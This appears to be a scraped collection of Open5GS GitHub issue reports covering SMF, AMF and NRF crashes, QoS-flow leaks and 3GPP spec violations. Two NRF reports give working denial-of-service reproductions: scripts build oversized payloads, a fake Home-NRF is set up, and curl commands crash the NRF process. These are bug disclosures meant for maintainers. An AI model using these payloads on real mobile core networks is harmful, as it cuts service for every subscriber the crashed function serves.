   - Log a clear error message indicating which IEs are missing
   - Either:
     - **Option A:** Send an error response back to AMF indicating the incomplete message
     - **Option B:** Skip the PFCP update and continue processing (if semantically valid)
     - **Option C:** Use default/fallback values if appropriate

3. **Graceful degradation:** The SMF process should remain stable and continue serving other PDU sessions

4. **Example expected log:**
```
   [smf] WARNING: PDUSessionResourceSetupResponse missing upTNLInformation IE
   [smf] ERROR: Cannot build PFCP Session Modification Request - insufficient tunnel info
   [smf] INFO: Sending error response to AMF
```

**No process crash should occur** - this is a network message parsing issue, not a fatal system error.

### Observed Behaviour

1. **Immediate crash:** SMF process terminates with `SIGABRT` when processing the malformed message

2. **No error recovery:** The assertion provides no opportunity for error handling or recovery

3. **Service disruption:**
   - All existing PDU sessions managed by this SMF instance are terminated
   - New session setup requests cannot be processed until SMF is restarted
   - Complete denial of service for all users served by this SMF

4. **Impact scope:**
   - **Single message** can crash the entire SMF instance
   - Affects **all UEs** currently connected through this SMF
   - Requires **manual intervention** (process restart) to restore service



This is a **Denial of Service (DoS) vulnerability**:
- **Attack vector:** Network-accessible via NGAP interface (N2)
- **Privilege required:** Ability to send NGAP messages to AMF (e.g., compromised gNB or malicious UE with modified protocol stack)
- **Impact:** Complete SMF service disruption
- **Reproducibility:** 100% - single malformed message triggers crash

### eNodeB/gNodeB

UERANSIM：the latest

### UE Models and versions

UERANSIM：the latest

items.title: [Bug]: SMF leaks QoS flows in `sess->bearer_list` when SmPolicyDecision is treated as full-state replacement; violates TS 23.503 §6.1.3.2.4 mandate to delete QoS Flow when last PCC rule is removed

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Open5GS Release, Revision, or Tag

`v2.7.7` + 6 commits ahead of upstream main (commit `288f1ca49`). Reproduced with the `npcf-handler.c` and `binding.c` paths unchanged from upstream. Observed under heavy IMS workload (P-CSCF→PCF N5 PolicyAuthorization, multiple AppSessions per PDU session over time).

## Summary

`update_authorized_pcc_rule_and_qos()` in `src/smf/npcf-handler.c` rebuilds `sess->policy.pcc_rule[]` from scratch on every `SmPolicyDecision` notify (Create/Update/Delete), zeroing all prior entries. This treats the notify as **full-state replacement**, which contradicts TS 23.503 §6.1.3.2.2 — the PCF only includes PCC rules being **added, modified, or removed** in a notify; rules absent from the message remain authorized.

Downstream consequence: when a per-AppSession DELETE-notify races with a subsequent CREATE/UPDATE-notify (very common under IMS call churn), the rule the DELETE-notify wants to REMOVE has already been wiped from `policy.pcc_rule[]` by the rebuild. SMF logs `QosFlow[Id:%s] has already been removed` (`src/smf/binding.c:756-758`) and **does not delete the QoS Flow** — directly violating the normative *"the SMF shall delete the QoS Flow"* mandate of TS 23.503 §6.1.3.2.4.

The orphaned QoS flow stays in `sess->bearer_list` indefinitely. Because `OGS_MAX_NUM_OF_BEARER` is 4 in `lib/proto/types.h`, the bearer list fills after a small number of churned AppSessions; the next call requesting two flows (audio + video medComponents) hits `ogs_error("QosFlow Overflow[%d]", ...)` at `src/smf/binding.c:547`, the second flow never installs, and from the UE's perspective the call dies with `580 Precondition Failure` (no 5QI=2 video bearer authorized).

## Spec citations (TS 23.503 v18.10.0)

**§6.1.3.2.2 Session binding** — SmPolicyDecision is delta-based:
> *"Once it has determined the impacted PDU Session, the PCF shall identify the PCC rules affected by the AF session information, **including new PCC rules to be installed and existing PCC rules to be modified or removed**."*

**§6.1.3.2.4 QoS Flow binding** — SMF must delete the QoS Flow when last PCC rule is removed:
> *"When the PCF removes a PCC Rule, the SMF shall remove the association of the PCC Rule to the QoS Flow. **If the last PCC rule that is bound to a QoS Flow is removed, the SMF shall delete the QoS Flow.**"*

**§6.1.3.13 Resource sharing for different AF sessions** — AF session termination triggers PCC rule removal:
> *"The AF session termination or modification procedure that removes media flows triggers the removal of the corresponding PCC rules from the SMF."*

## Steps to reproduce

Any deployment with frequent SmPolicyDecision UpdateNotify churn will reproduce this. We hit it consistently with an IMS workload (Kamailio P-CSCF speaking standard N5 PolicyAuthorization to Open5GS PCF):

1. Two registered IMS UEs, both with PCC rules in MongoDB for 5QI=1 (voice) and 5QI=2 (video).
2. Place a video call (audio + video medComponents in the SDP). P-CSCF creates an AppSession at PCF (`POST /npcf-policyauthorization/v1/app-sessions`).
3. PCF emits `SmPolicyDecision` UpdateNotify to SMF with two PCC rule INSTALLs (IDs like `<dbId>-a<appSessId>`, generated at `src/pcf/npcf-handler.c:946` as `ogs_msprintf("%s-a%s", db_pcc_rule->id, app_session->app_session_id)`).
4. End the call. P-CSCF DELETEs the AppSession at PCF.
5. PCF emits a second UpdateNotify with NULL-valued `PccRuleMap` entries (REMOVE) for those rule IDs.
6. Repeat steps 2–5 several times. SMF eventually logs:
   ```
   ERROR: QosFlow Overflow[4] (../src/smf/binding.c:547)
   WARNING: QosFlow[Id:ims-n2-a85] has already been removed. (../src/smf/binding.c:757)
   WARNING: QosFlow[Id:ims-n2-a84] has already been removed. (../src/smf/binding.c:757)
   ```

## Expected behavior

Per TS 23.503 §6.1.3.2.2, an SmPolicyDecision update is a **delta** over the current authorized set. PCC rules NOT mentioned in a notify should remain unaffected. PCC rules in the notify with NULL value should be REMOVED, and per §6.1.3.2.4 the corresponding QoS Flow should be deleted if it had no other PCC rule bound to it.

## Actual behavior

`update_authorized_pcc_rule_and_qos()` in `src/smf/npcf-handler.c` zeroes the entire policy table on every notify:

```c
if (SmPolicyDecision->pcc_rules) {
    /* … */
    for (i = 0; i < sess->policy.num_of_pcc_rule; i++)
        OGS_PCC_RULE_FREE(&sess->policy.pcc_rule[i]);
    sess->policy.num_of_pcc_rule = 0;

    OpenAPI_list_for_each(SmPolicyDecision->pcc_rules, node) {
        /* rebuild policy.pcc_rule[] from scratch from the new map */
    }
}
```

Then `smf_qos_flow_binding(sess)` (called by the SmPolicyControl create/update handler) iterates the rebuilt `policy.pcc_rule[]`. For TYPE_REMOVE entries it does:

```c
qos_flow = smf_qos_flow_find_by_pcc_rule_id(sess, pcc_rule->id);
if (!qos_flow) {
    ogs_warn("No need to send 'Session Modification Request'");
    ogs_warn("  - QosFlow[Id:%s] has already been removed.", pcc_rule->id);
    continue;
}
```

If the DELETE-notify arrives after a subsequent CREATE-notify (the rebuild already happened), the rule the DELETE-notify wants to REMOVE is no longer in policy.pcc_rule[] — but the corresponding entry in `sess->bearer_list` is **never reaped**, because `bearer_list` is keyed by `qos_flow->pcc_rule.id`, not by what's in `policy.pcc_rule[]`. The qos_flow stays orphaned.

Eventually:

```c
if (ogs_list_count(&sess->bearer_list) >= OGS_MAX_NUM_OF_BEARER) {
    ogs_error("QosFlow Overflow[%d]", ogs_list_count(&sess->bearer_list));
    continue;   /* the new flow is never created */
}
```

with `OGS_MAX_NUM_OF_BEARER = 4` (`lib/proto/types.h:32`).

For the new INVITE that triggered this, the audio/video medComponents either land short (only audio installs, video is dropped) or both are dropped — the term UE sees the QoS preconditions fail and returns `580 Precondition Failure`.

## Why the race window exists

PCC rule IDs in `src/pcf/npcf-handler.c:946` are formed as `<dbId>-a<appSessId>`, so each call generates unique rule IDs. Concurrent or rapidly-sequential AppSession lifecycle events arrive at SMF as separate `SmPolicyDecision` notifies. Each notify rebuilds the policy table before processing its own contents, so a late-arriving DELETE-notify for AppSession N can find that policy.pcc_rule[] no longer contains its rule (it was wiped by the CREATE-notify for AppSession N+1).

## Proposed fix

Two paths, ordered by spec-cleanness:

**Cleanest (spec-aligned):** treat `SmPolicyDecision.pcc_rules` as an incremental delta. Don't zero `policy.pcc_rule[]`. Walk the incoming map: entries with non-NULL value INSTALL/MODIFY (replacing or adding to the existing policy table); entries with NULL value REMOVE. Rules already in the table that are absent from the notify stay unchanged. This brings `update_authorized_pcc_rule_and_qos()` into compliance with TS 23.503 §6.1.3.2.2.

**Less invasive (still compliant):** keep the rebuild loop, but BEFORE wiping, snapshot the current `policy.pcc_rule[]`. After rebuild, walk `sess->bearer_list` — for any qos_flow whose `pcc_rule.id` is in the snapshot but not in the new `policy.pcc_rule[]` AND was not explicitly REMOVED in the notify, emit a synthesized REMOVE entry. (My team attempted a variant of this without the snapshot/explicit-REMOVE distinction; the naive form misidentifies static IMS PCC rules — `ims-n1`, `ims-n2`, provisioned at PDU-session-create time and not present in per-call AppSession notifies — as orphans, leading to over-reaping. The snapshot approach avoids this by only acting on rules that were transiently authorized.)

Separately, `OGS_MAX_NUM_OF_BEARER = 4` in `lib/proto/types.h:32` is conservative even without a leak — TS 23.501 §5.7.1.1 places no explicit per-PDU-session cap below the QFI bit-width ceiling of 64, and only Unstructured-type PDU sessions have the explicit "*maximum one 5G QoS Flow per PDU Session*" restriction (§5.7.3). We've bumped it to 16 locally as a stopgap; suggest bumping upstream to a more realistic value (e.g. 16 or 32) regardless of how the leak is fixed, with proportional bumps to `OGS_MAX_NUM_OF_PCC_RULE` and `OGS_BEARER_PER_UE`.

## Related (existing) reports

- Issue [#869](https://github.com/open5gs/open5gs/issues/869) — VoLTE multi-bearer with call-hold breakage. Same class of failure (second dedicated bearer goes missing under multi-call churn). Closed `Housekeeping:ToClose` without confirmed fix.
- Issue [#4233](https://github.com/open5gs/open5gs/issues/4233) — SGW-C bearer pool exhaustion crash. Marked `status:already-fixed` for SGW-C; SMF still asserts/overflows.
- Discussion [#2631](https://github.com/open5gs/open5gs/discussions/2631) — SMF crash on multiple PDU session release. Same race-condition class on the AppSession lifecycle. Unanswered since 2023.
- Issue [#2115](https://github.com/open5gs/open5gs/issues/2115) — `smf_npcf_smpolicycontrol_build_delete: Assertion sess->sm_context_ref failed`. Same race-condition class.

Happy to provide additional logs (full SMF/PCF/SCP traces during reproduction) or a minimal reproducing test case if useful. Also have local diffs of the two fix paths described above (the conservative one is already running on our deployment) — can submit as a PR if maintainers prefer.

items.title: Missing Concurrent NAS SMC Validation During NGAP Handover

labels.name: status:needs-planning
labels.description: Issue accepted and needs planning into milestones

labels.name: type:spec-noncompliance
labels.description: Non-compliance with mandatory 3GPP specification requirements.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Summary

The AMF in Open5GS v2.7.6 does not enforce the concurrent security procedure rules defined in 3GPP TS 33.501 §6.9.5.1. The AMF initiates a NAS Security Mode Command while an N2 handover procedure (including a new NH/NCC key) is still ongoing, and vice versa. This can lead to mismatches between NAS and AS security contexts in the network and the UE.

### Details

**Affected Files:**
- `src/amf/gmm-sm.c:2525` — `gmm_state_security_mode()`: No check for ongoing N2 procedure before sending SMC (Rule 2 violation)
- `src/amf/ngap-handler.c:3070~` — HandoverRequired handler: No check for ongoing SMC before initiating N2 (Rule 1 violation)

**Root Cause:**

3GPP TS 33.501 §6.9.5.1 states:

> "Concurrent runs of security procedures may, in certain situations, lead to mismatches between security contexts in the network and the UE. In order to avoid such mismatches, the following rules shall be adhered to:
> 1. AMF shall not initiate any of the N2 procedures including a new key towards a UE if a NAS Security Mode Command procedure is ongoing with the UE.
> 2. The AMF shall not initiate a NAS Security Mode Command towards a UE if one of the N2 procedures including a new key is ongoing with the UE."

Open5GS AMF does not implement cross-procedure checks:

**Rule 2 violation :**
`gmm_state_security_mode()` sends SMC on `OGS_FSM_ENTRY_SIG` without checking if an N2 handover procedure is ongoing for the UE.

**Rule 1 violation :**
The HandoverRequired handler initiates N2 (sends HandoverRequest with SecurityContext including NH/NCC) without checking if SMC is ongoing. Open5GS uses a `paging.ongoing` field for paging state, but has no equivalent mechanism to track SMC/N2 concurrent state.

**Why NH/NCC and SMC are related:**

SMC activates a new KAMF, which changes the basis for NH key derivation. The N2 HandoverRequest includes NH/NCC derived from the old KAMF. If both procedures run concurrently:
- The target gNB receives NH/NCC based on the old KAMF
- The UE derives keys based on the new KAMF (after SMC)
- This results in KgNB mismatch between UE and target gNB

This is exactly the scenario §6.9.5.1 was designed to prevent.

### PoC

**Environment:**
- Open5GS v2.7.6 AMF 
- UERANSIM v3.2.7
- tshark for packet capture

**Reproduction Steps:**

1. Start Open5GS full NF stack. Register a UE through gNB_A.
2. Send HandoverRequired from gNB_A. AMF sends HandoverRequest (including SecurityContext with NH/NCC) to gNB_B. gNB_B does not respond → N2 procedure ongoing.
3. Kill the UE process and restart it to trigger re-registration.
4. Observe that AMF processes the re-registration (Auth → SMC) without waiting for the N2 procedure to complete or cancelling it.

**Packet Evidence (pcap available):**

| Packet | Time | Message | Description |
|--------|------|---------|-------------|
| #1 | 0.000s | HandoverRequired | gNB_A requests handover |
| #2 | 0.000s | **HandoverRequest** | **N2 started (NH/NCC included)** |
| | | *(no response from gNB_B)* | **N2 ongoing** |
| #4 | 2.169s | Registration request | UE re-registers (same SUPI) |
| #5 | 2.174s | Authentication request | |
| #6 | 2.175s | Authentication failure (Synch) | SQN resync |
| #7 | 2.179s | Authentication request | Retry |
| #8 | 2.179s | Authentication response | |
| #9 | 2.181s | **Security mode command** | **SMC during N2 ongoing = Rule 2 violation** |


### Expected behaviour

The AMF should track per-UE security procedure state and serialize the two procedure families (Rule 1 / Rule 2 of TS 33.501 §6.9.5.1):

1. While a NAS Security Mode Command procedure is ongoing for a UE, the AMF must not initiate any N2 procedure that introduces a new key (e.g. a `HandoverRequest` carrying NH/NCC). Such an N2 procedure should be deferred until SMC completes (or aborts).
2. Symmetrically, while an N2 procedure carrying a new key is outstanding (e.g. a `HandoverRequest` for which no `HandoverRequestAcknowledge`/`HandoverFailure` has been received), the AMF must not start a NAS SMC for the same UE.

The intent of the rule is to prevent the UE, the source gNB, the target gNB, and the AMF from ending up with key material derived from different KAMF generations.

### Observed Behaviour

Open5GS AMF has no state field that tracks "N2 with new key in flight" or "SMC in flight" across the AMF state machine and the NGAP handler. As a result:

- `gmm_state_security_mode()` (`src/amf/gmm-sm.c:2525`) sends the SMC on `OGS_FSM_ENTRY_SIG` without consulting any cross-procedure flag.
- The HandoverRequired handler (`src/amf/ngap-handler.c:3070~`) builds and sends `HandoverRequest` (with NH/NCC) without checking whether an SMC is currently outstanding.

In the captured trace, after a `HandoverRequired` triggers `HandoverRequest` to a target gNB and that gNB does not respond, the N2 procedure remains in flight on the AMF side. A re-registration of the same UE then drives the AMF into Authentication → SMC, and the SMC is sent to the UE while the unanswered N2 with NH/NCC is still pending — two security procedures coexisting for the same UE, which §6.9.5.1 was specifically written to prevent.

### eNodeB/gNodeB

UERANSIM v3.2.7

### UE Models and versions

UERANSIM v3.2.7

items.title: [Bug]: NRF crash on `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}` by exhausting the NF-info pool through `smfInfoList`

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when a valid NF registration contains an oversized `smfInfoList` map.

This is not the already-documented `smfInfo.sNssaiSmfInfoList[*].dnnSmfInfoList`
fixed-array assertion. Here the crash comes earlier, because
`ogs_nnrf_nfm_handle_nf_profile()` iterates over every `smfInfoList` entry and
calls `handle_smf_info()` once per entry:

```c
OpenAPI_list_for_each(NFProfile->smf_info_list, node) {
    OpenAPI_map_t *SmfInfoMap = node->data;
    if (SmfInfoMap && SmfInfoMap->value)
        handle_smf_info(nf_instance, SmfInfoMap->value);
}
```

`handle_smf_info()` allocates one `ogs_sbi_nf_info_t` per entry and asserts if
the fixed `nf_info_pool` is exhausted:

```c
nf_info = ogs_sbi_nf_info_add(&nf_instance->nf_info_list, OpenAPI_nf_type_SMF);
ogs_assert(nf_info);
```

`ogs_sbi_nf_info_add()` logs a fatal allocation failure and returns `NULL`:

```c
ogs_pool_alloc(&nf_info_pool, &nf_info);
if (!nf_info) {
    ogs_fatal("ogs_pool_alloc() failed");
    return NULL;
}
```

The pool is sized as:

```c
ogs_pool_init(&nf_info_pool, ogs_app()->pool.nf * OGS_MAX_NUM_OF_NF_INFO);
```

With default settings that becomes `64 * 8 = 512`. A single NF registration
request with enough `smfInfoList` entries can therefore exhaust the pool and
terminate NRF.

### Root cause

- Entry route:
  `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Iteration site:
  `../lib/sbi/nnrf-handler.c:272-275`
- Allocation site:
  `../lib/sbi/nnrf-handler.c:413-415`
- Exact helper failure:
  `../lib/sbi/context.c:1674-1677`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling field:
  `NFProfile.smfInfoList`

### Steps to Reproduce

1. Resolve the current NRF IP:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
echo "$NRF_IP"
```

2. Generate a small control payload and a large malicious payload:

```bash
node <<'NODE'
const fs = require('fs');

function smfInfoEntry(dnn) {
  return {
    sNssaiSmfInfoList: [
      {
        sNssai: { sst: 1, sd: '000001' },
        dnnSmfInfoList: [{ dnn }],
      },
    ],
  };
}

function makeProfile(id, count) {
  const smfInfoList = {};
  for (let i = 0; i < count; i++) {
    smfInfoList[`entry-${String(i + 1).padStart(4, '0')}`] =
      smfInfoEntry(`dnn-${i + 1}`);
  }
  return {
    nfInstanceId: id,
    nfType: 'SMF',
    nfStatus: 'REGISTERED',
    fqdn: `${id}.example.org`,
    smfInfoList,
  };
}

fs.writeFileSync('/tmp/nrf-smfinfo-list-control.json', JSON.stringify(
  makeProfile('66666666-6666-6666-6666-666666666666', 4)
));
fs.writeFileSync('/tmp/nrf-smfinfo-list-bomb.json', JSON.stringify(
  makeProfile('77777777-7777-7777-7777-777777777777', 520)
));
NODE
```

3. Control case: register the NF with four `smfInfoList` entries.

```bash
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 \
  -X PUT "http://$NRF_IP/nnrf-nfm/v1/nf-instances/66666666-6666-6666-6666-666666666666" \
  -H 'content-type: application/json' \
  --data @/tmp/nrf-smfinfo-list-control.json
```

4. Malicious case: restart NRF and send the oversized `smfInfoList` profile.

```bash
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 \
  -X PUT "http://$NRF_IP/nnrf-nfm/v1/nf-instances/77777777-7777-7777-7777-777777777777" \
  -H 'content-type: application/json' \
  --data @/tmp/nrf-smfinfo-list-bomb.json

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 20
```

### Logs

```shell
Control response:


HTTP/2 201


Malicious client-visible failure:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream


Container state after the crash:


exited 139 2026-04-12T06:23:56.878437103Z 0


NRF logs:


04/12 06:23:56.792: [sbi] FATAL: ogs_pool_alloc() failed (../lib/sbi/context.c:1676)
04/12 06:23:56.792: [sbi] FATAL: handle_smf_info: Assertion `nf_info' failed. (../lib/sbi/nnrf-handler.c:415)
04/12 06:23:56.792: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

NRF should reject unreasonably large `smfInfoList` collections with a normal HTTP error and remain running.

### Observed Behaviour

A single valid NF registration containing an oversized `smfInfoList` map terminates the NRF process with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: NRF crash on inter-PLMN `NNRF_DISC` `SearchResult` by exhausting the NF instance pool

labels.name: Type:Security
labels.description: Security issue

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when an inter-PLMN discovery request causes the local NRF to query a
Home-PLMN NRF and the Home-NRF `SearchResult` contains too many distinct
`nfInstances`.

This is a client-response trust-boundary bug, not a direct
`nnrf-nfm/nf-instances` registration bug. The local NRF enters the inter-PLMN
fallback path, sends a downstream discovery request to the Home NRF, and then
parses the returned `SearchResult` through:

```c
OpenAPI_list_for_each(SearchResult->nf_instances, node) {
    ...
    nf_instance = ogs_sbi_nf_instance_find(NFProfile->nf_instance_id);
    if (!nf_instance) {
        nf_instance = ogs_sbi_nf_instance_add();
        ogs_assert(nf_instance);
    }
}
```

`ogs_sbi_nf_instance_add()` allocates from a fixed `nf_instance_pool` and
asserts when the pool is exhausted:

```c
ogs_pool_alloc(&nf_instance_pool, &nf_instance);
ogs_assert(nf_instance);
```

Pool sizing comes from the peer limit:

```c
ogs_app()->pool.nf = global_conf.max.peer;
```

With default settings this is `64`. In a fresh NRF process, the pool already
contains the local NRF instance, and the inter-PLMN fallback path also adds a
temporary Home-NRF entry before parsing the response. A malicious Home-NRF
response with enough unique `nfInstances` therefore crashes the local NRF.

### Root cause

- Entry route:
  `GET /nnrf-disc/v1/nf-instances` with inter-PLMN parameters
- Downstream client path:
  local NRF -> Home NRF `GET /nnrf-disc/v1/nf-instances`
- Response iteration site:
  `../src/nrf/nnrf-handler.c:1419-1449`
- Exact crash site:
  `../lib/sbi/context.c:1235-1236`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling field:
  `SearchResult.nfInstances[*].nfInstanceId`

### Steps to Reproduce

1. Run a fake h2c Home NRF on the Docker `open5gs` network:

```bash
docker rm -f hnrfctl 2>/dev/null || true
docker run -d --name hnrfctl --network open5gs --network-alias hnrfctl \
  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \
  node:22-alpine node /srv/nrf_fake_hnrf.js
```

2. Resolve the current local NRF IP:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
echo "$NRF_IP"
```

3. Control case: configure the helper to return one benign foreign NF and send
   an inter-PLMN discovery request:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 8 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'
```

4. Malicious case: switch the helper to `many-instances`, restart the local
   NRF to clear cached foreign NF entries, and send the same request again:

```bash
printf 'many-instances\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 20
```

### Logs

```shell
Control response:


HTTP/2 200
{"validityPeriod":30,"nfInstances":[{"nfInstanceId":"fake-foreign-udr-safe",...}]}


Malicious client-visible failure:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream


Container state after the crash:


exited 139 2026-04-12T06:24:40.452605766Z 0


NRF logs:


04/12 06:24:40.364: [nrf] INFO: [fake-foreign-udr-many-062] (NF-discover) NF registered [type:UDR] (../src/nrf/nnrf-handler.c:1460)
04/12 06:24:40.364: [sbi] FATAL: ogs_sbi_nf_instance_add: Assertion `nf_instance' failed. (../lib/sbi/context.c:1236)
04/12 06:24:40.364: [core] FATAL: backtrace() returned 11 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

The local NRF should reject or cap oversized Home-NRF `SearchResult` collections without abortin

### Observed Behaviour

A single malicious Home-NRF discovery response with many distinct NF profiles terminates the local NRF process with exit code `139`.

labels.name: type:bug

labels.name: Housekeeping:ToClose

items.body:
### Open5GS Release, Revision, or Tag

v2.7.0

### Steps to reproduce

Please set up the environment following the instructions at [https://github.com/s5uishida/open5gs_5gc_ueransim_sample_config](https://github.com/open5gs/open5gs/issues/url), we use just one UE and one UPF.
Our fuzzing tool found a possible bug when testing UE attachment process.
Just continuously run this script until SMF crashes.
```shell
#!/bin/bash
./open5gs/install/bin/open5gs-amfd &
ssh user@xxx.xxx.xxx.xxx /UERANSIM/build/runGnb.sh &
ssh user@xxx.xxx.xxx.xxx /UERANSIM/build/runUE.sh &
sleep 1.5
pkill open5gs-amfd
ssh user@xxx.xxx.xxx.xxx pkill nr-gnb
ssh user@xxx.xxx.xxx.xxx pkill nr-ue
``` 
This script means opening AMF and gNB, and initiating UE attach process when all other network elements are already up. It then terminates AMF, gNB, and UE before the UE attach process is completed.
[smf.log](https://github.com/open5gs/open5gs/files/14801892/smf.log)


### Logs

```shell

items.title: [Bug]: NF does not clean up SBI's "client" context
items.body:
### Open5GS Release, Revision, or Tag

latest main

### Steps to reproduce



- To replicate the issue faster, modify amf.yaml and add/change
```
max:
  peer: 10
```

- Start NRF, SCP, AMF.

- Start UDM, wait for it to register to NRF, then stop it.
- Modify udm.yaml, assign a new IP address for UDM.
```
udm:
  sbi:
    - addr: 127.0.0.100
```

- Repeat a couple of times with starting the UDM, stopping it, and changing IP address to a completely new one.
- AMF receives a NF status notification from NRF each time UDM is started/stopped.
- On UDM deregistering, AMF does not properly clean up SBI's 'client' context,
so it crashes once it exhausts it's memory pool of clients

### Logs

```shell
10/18 06:19:04.261: [sbi] INFO: [3c730420-6d7e-41ee-b864-f35eef7b12ca] (NRF-notify) NF registered (../lib/sbi/nnrf-handler.c:725)
10/18 06:19:04.261: [sbi] INFO: [3c730420-6d7e-41ee-b864-f35eef7b12ca] (NRF-notify) NF Profile updated (../lib/sbi/nnrf-handler.c:735)
10/18 06:19:04.261: [sbi] FATAL: ogs_sbi_client_add: Assertion `client' failed. (../lib/sbi/client.c:111)
10/18 06:19:04.262: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
/usr/local/lib/x86_64-linux-gnu/libogssbi.so.2(ogs_sbi_client_add+0x22b) [0x7fcf01200ef5]
/usr/local/lib/x86_64-linux-gnu/libogssbi.so.2(+0x43e0f) [0x7fcf0120ee0f]
/usr/local/lib/x86_64-linux-gnu/libogssbi.so.2(+0x4421c) [0x7fcf0120f21c]
/usr/local/lib/x86_64-linux-gnu/libogssbi.so.2(ogs_sbi_client_associate+0x3eb) [0x7fcf0120fa77]
/usr/local/lib/x86_64-linux-gnu/libogssbi.so.2(ogs_nnrf_nfm_handle_nf_status_notify+0xc9e) [0x7fcf0121ca85]
open5gs-amfd(+0x37c1c) [0x56497605bc1c]
/usr/local/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x119) [0x7fcf0172bc0c]
open5gs-amfd(+0xa2cc) [0x56497602e2cc]
/usr/local/lib/x86_64-linux-gnu/libogscore.so.2(+0x1197a) [0x7fcf0171c97a]
/lib/x86_64-linux-gnu/libc.so.6(+0x94ac3) [0x7fcf008edac3]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x44) [0x7fcf0097ebf4]
Aborted
```
```


### Expected behaviour

`ogs_sbi_client_t` should be deallocated in case that noone references it anymore.

### Observed Behaviour

When NF receives info about a new registered NF from NRF, it allocates `ogs_sbi_client_t` from the memory pool.
Then it's reference counter is incremented via a macro `OGS_SBI_SETUP_CLIENT()` by a `ogs_sbi_nf_instance_t` and for each `ogs_sbi_nf_service_t`.

When NF instance is deregistered, reference counters for both `ogs_sbi_nf_instance_t` and `ogs_sbi_nf_service_t` is correctly decremented.
But noone decrements the ref counter of the `ogs_sbi_client_t` the final time, causing a `client` to remain active in the pool.

This works without a problem, in case that all NF's are given static IP's. `ogs_sbi_client_t` will be then reused, since the IP hasn't changed. But in the case of Kubernetes environment, each time that a NF restarts, it will be given a new Service IP, causing a client pool to exhaust of it's items.


Any suggestions on how to attempt to fix this issue?
Commenting out `OGS_OBJECT_REF(client);` in `ogs_sbi_client_add()` of course does not work, since it deallocates the context prematurely.

### eNodeB/gNodeB

N/A

### UE Models and versions

N/A

### Expected behaviour

I expected the `amf_ue->mac_failed` flag to be cleared during security mode procedure but it was not. 
At this point, the only way to cleare the `amf_ue->mac_failed` flag is by UE Context Release.
But I'd like to connect UEs as fast as possible without UE Context Release.

I've tried to fix it on my own, but I'm not sure when the `amf_ue->mac_failed` flag should be cleared. 
I couldn't find any relevant suggestion in 3GPP.

Any assistance on this matter would be greatly appreciated. Thank you in advance:)

### Observed Behaviour

During Registration, UE sends Security Mode Complete as a response to Security Mode Command
but AMF ignores Security Mode Complete with the following log.
```
[gmm] WARNING: [imsi-450401362010032] No Security Context (../src/amf/gmm-sm.c:1603)
```

If MAC verification fails even once, Security Mode Procedure cannot be completed, and UE cannot be registered. 
The lines below block all Security Mode Complete messages.
https://github.com/open5gs/open5gs/blob/79d3c7078f04b4efefd21230f3f40acb28b174ea/src/amf/gmm-sm.c#L1676-L1679
You have to remove UE_CONTEXT to register the UE again.

### eNodeB/gNodeB

QCT OmniRAN

### UE Models and versions

QCT E3D

items.title: [AMF] Unexpected UE Aggregate Maximum Bit Rate IE in the NGAP initial context setup request message

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
Hi,

we experienced some issues in our 5G SA testbed (Quectel RM500 + Amarisoft Callbox + Open5Gs). Although being able to connect and obtain an IP address, it seems that the UE is not able to initiate a PDU session. It gets only fixed when restarting the gNB or after an UE context release. 

